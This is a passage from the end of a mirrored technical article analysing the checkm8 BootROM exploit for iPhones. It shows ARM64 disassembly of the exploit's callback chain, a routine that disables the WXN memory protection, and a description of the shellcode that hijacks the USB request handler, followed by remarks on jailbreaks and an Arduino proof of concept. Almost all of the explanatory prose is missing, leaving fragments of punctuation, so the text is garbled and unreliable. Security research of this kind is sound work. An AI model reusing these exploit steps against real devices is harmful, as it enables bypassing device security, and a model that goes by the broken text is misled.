<pre><code class="plaintext hljs">0000000100000478: DMB SY<font></font>
000000010000047C: RET</code></pre><br>
<p> ,      ,    .   ,            ,   .</p><br>
<h4 id="53-enter_critical_section">5.3. <code>enter_critical_section()</code></h4><br>
<p>        .</p><br>
<h4 id="54-write_ttbr00x1800b0000">5.4. <code>write_ttbr0(0x1800B0000)</code></h4><br>
<pre><code class="plaintext hljs">00000001000003E4: MSR #0, c2, c0, #0, X0; [&gt;] TTBR0_EL1 (Translation Table Base Register 0 (EL1))<font></font>
00000001000003E8: ISB<font></font>
00000001000003EC: RET</code></pre><br>
<p>     <code>TTBR0_EL1</code>  <code>0x1800B0000</code>.   <code>INSECURE MEMORY</code>,     .    ,         :</p><br>
<pre><code class="plaintext hljs">...<font></font>
0x1800B0400: 0x1000006a5           0x100000000 -&gt; 0x100000000 (rx)<font></font>
...<font></font>
0x1800B0600: 0x60000180000625      0x180000000 -&gt; 0x180000000 (rw)<font></font>
0x1800B0608: 0x1800006a5           0x182000000 -&gt; 0x180000000 (rx)<font></font>
...</code></pre><br>
<h4 id="55-tlbi">5.5. <code>tlbi</code></h4><br>
<pre><code class="plaintext hljs">0000000100000434: DSB SY<font></font>
0000000100000438: SYS #0, c8, c7, #0<font></font>
000000010000043C: DSB SY<font></font>
0000000100000440: ISB<font></font>
0000000100000444: RET</code></pre><br>
<p>     ,          .</p><br>
<h4 id="56-0x1820b0610---disable_wxn_arm64">5.6. <code>0x1820B0610 - disable_wxn_arm64</code></h4><br>
<pre><code class="plaintext hljs">MOV  X1, #0x180000000<font></font>
ADD  X2, X1, #0xA0000<font></font>
ADD  X1, X1, #0x625<font></font>
STR  X1, [X2,#0x600]<font></font>
DMB  SY<font></font>
<font></font>
MOV  X0, #0x100D<font></font>
MSR  SCTLR_EL1, X0<font></font>
DSB  SY<font></font>
ISB<font></font>
<font></font>
RET</code></pre><br>
<p>  <code>WXN</code> (Write permission implies Execute-never),       <code>RW</code> .     <code>WXN</code>  -      .</p><br>
<h4 id="57-write_ttbr00x1800a0000">5.7. <code>write_ttbr0(0x1800A0000)</code></h4><br>
<pre><code class="plaintext hljs">00000001000003E4: MSR #0, c2, c0, #0, X0; [&gt;] TTBR0_EL1 (Translation Table Base Register 0 (EL1))<font></font>
00000001000003E8: ISB<font></font>
00000001000003EC: RET</code></pre><br>
<p>     <code>TTBR0_EL1</code>.       <code>BootROM</code>    ,     <code>INSECURE_MEMORY</code>  .</p><br>
<h4 id="58-tlbi">5.8. <code>tlbi</code></h4><br>
<p>    .</p><br>
<h4 id="59-exit_critical_section">5.9. <code>exit_critical_section()</code></h4><br>
<p>     .</p><br>
<h4 id="510-0x1800b0000">5.10. <code>0x1800B0000</code></h4><br>
<p>   <code>shellcode</code> .</p><br>
<p> ,   <code>callback-chain</code> —   <code>WXN</code>     <code>shellcode</code>  <code>RW</code>-.</p><br>
<h2 id="6-ispolnenie-shellcode">6.  <code>shellcode</code></h2><br>
<p> <code>shellcode</code>   <code>src/checkm8_arm64.S</code>   :</p><br>
<h4 id="61-perezapis-konfiguracionnyh-usb-deskriptorov">6.1.   <code>USB</code>-</h4><br>
<p>         <code>usb_core_hs_configuration_descriptor</code>  <code>usb_core_fs_configuration_descriptor</code>,   .        .         <code>USB</code>-, <code>shellcode</code>  .</p><br>
<h4 id="62-izmenenie-usbserialnumber">6.2.  <code>USBSerialNumber</code></h4><br>
<p>  -   ,     <code>" PWND:[checkm8]"</code>.     ,    .</p><br>
<h4 id="63-perezapis-ukazatelya-obrabotchika-usb-zaprosov-na-novyy">6.3.    <code>USB</code>-  </h4><br>
<p>    <code>USB</code>-       ,        .</p><br>
<h4 id="64-kopirovanie-obrabotchika-usb-zaprosov-v-trampoline-oblast-pamyati-0x1800afc00">6.4.   <code>USB</code>-  <code>TRAMPOLINE</code>   (<code>0x1800AFC00</code>)</h4><br>
<p>  <code>USB</code>-    <code>wValue</code>   <code>0xffff</code> ,    ,     .   ,         : <code>memcpy</code>, <code>memset</code>  <code>exec</code> (      ).</p><br>
<p>      .</p><br>
<h2 id="realizaciya-eksployta-na-bolee-nizkom-urovne-raboty-s-usb">        USB</h2><br>
<p>            <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="> Proof-of-Concept</a>  <code>checkm8</code>  <code>Arduino</code>  <code>Usb Host Shield</code>. PoC    <code>iPhone 7</code>,         .   <code>iPhone 7</code>  <code>DFU</code>   <code>Usb Host Shield</code>       ,      <code>PWND:[checkm8]</code>,       <code>USB</code>-         <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">ipwndfu</a> ( ,  -  ..).     ,       ,       <code>USB</code>-.      <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">USB_Host_Shield_2.0</a>.    , patch-    .</p><br>
<div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/7o/bx/ni/7obxni6ihhdg8tz0dljedtfmrwy.jpeg"></div><br>
<h2 id="vmesto-zaklyucheniya"> </h2><br>
<p>      .    <code>checkm8</code>   . ,               .          jailbreak-. ,     jailbreak   <code>checkm8</code> — <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">checkra1n</a>.    ,  jailbreak       ( <code>A5</code>  <code>A11</code>)    <code>iOS</code>.      <code>iWatch</code>, <code>Apple TV</code>    . ,             .</p><br>
<p> jailbreak,         Apple.   <code>checkm8</code>    verbose- <code>iOS</code>,  <code>SecureROM</code>   <code>GID</code>-    .   ,   ,           <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="> JTAG/SWD </a>.        , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">    </a>,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="> </a>. ,   <code>checkm8</code>,  <code>Apple</code>      .</p><br>
<h2 id="ssylki"></h2><br>
<ol>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">Jonathan Levin, *OS Internals: iBoot</a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">Apple, iOS Security Guide</a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">littlelailo, apollo.txt</a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">usb.org</a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">USB in a NutShell</a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">ipwndfu</a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="> ipwndfu  LinusHenze</a></li>
</ol></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ja471658/index.html">電話詐欺師。他の詐欺師について親切に言われた最初の行動</a></li>
<li><a href="../ja471660/index.html">プレイヤー心理学レクチャー</a></li>
<li><a href="../ja471662/index.html">Web-JavaScript認証、難読化、ネイティブコード。r0ot-mi Webによる問題解決—クライアント。パート1</a></li>
<li><a href="../ja471664/index.html">ABBYYでのインターンシップ：「あなた」になることができる会社</a></li>
<li><a href="../ja471666/index.html">就労ビザでドイツに移住するiOS開発者を体験する</a></li>
<li><a href="../ja471670/index.html">Jetpack Composeを戦闘で試してみませんか？</a></li>
<li><a href="../ja471676/index.html">Телефонные мошенники. Действие второе, в котором я срываюсь и бегу до ближайшего банкомата</a></li>
<li><a href="../ja471678/index.html">オンデマンドでサービスを提供</a></li>
<li><a href="../ja471684/index.html">nginxのモジュールを作成する必要がある理由</a></li>
<li><a href="../ja471686/index.html">AWSが回復力のあるサービスを醸造する方法。サーバーとデータベースのスケーリング</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>